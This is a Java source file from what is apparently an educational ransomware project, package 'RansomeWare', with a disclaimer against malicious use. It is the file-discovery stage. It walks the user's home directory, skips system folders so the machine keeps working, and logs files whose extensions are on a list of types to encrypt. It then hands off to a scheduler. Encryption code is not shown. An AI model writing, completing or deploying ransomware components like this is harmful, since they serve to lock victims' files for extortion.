/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
   __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


Copyright (c) 2019 Kyra Mozley
Created on 18/07/19
Version 1.0

Disclaimer: This project is purely for educational purposes 
DO NOT RUN THIS ON YOUR PERSONAL MACHINE
EXECUTE ONLY IN A TEST ENVIRONMENT
DO NOT USE FOR MALICIOUS ACTIVITY 

 *********************************************************************/
package RansomeWare;


import java.io.*;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

import static java.util.Map.Entry.comparingByValue;
import static java.util.stream.Collectors.toMap;


public class FindFiles {
    BufferedWriter fileWriter;

    //List of filetypes we want to encrypt
    List<String> allowedFiles;
    List<String> avoidDir;


    public void FindFiles() throws Exception {
        //Use System Property rather than C:\\ to make it OS independent

        String home = System.getProperty("user.home");

        //FOR DEVELOPMENT - NOT READY TO ENCRYPT EVERYTHING - JUST THE DOCUMENTS FOLDER
        //String home = System.getProperty("user.home")+ File.separator + "Desktop" + File.separator + "Documents";

        //Creating a file to write the files found into
        Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "output.txt", false);
        fileWriter = new BufferedWriter(writer);

        //List of allowed files
        allowedFiles = new FileTypes().AllowedTypes;
        avoidDir = new AvoidedDir().avoidDir;

        //Traverse the file system
        traverse(home);
        fileWriter.close();
    }

    public void traverse(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if (f.isDirectory()) {
                String name = f.getName();
                if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
                traverse(f.getAbsolutePath());

            } else {
                //split to get file extension
                int index = f.getName().lastIndexOf(".");
                String fileType = f.getName().substring(index + 1);

                //if file extension is allowed, write to file with last mod
                if(allowedFiles.contains("." + fileType.toUpperCase())) {
                    long lastmod = f.lastModified();
                    fileWriter.write(f.getAbsolutePath() + ", " + lastmod);
                    System.out.println(f.getAbsolutePath() + ", " + lastmod);
                    fileWriter.newLine();
                }
            }
        }
    }



    public static void main(String[] args) throws Exception {
        FindFiles ff = new FindFiles();
        ff.FindFiles();
        Scheduler s = new Scheduler();
        s.function();
    }

}
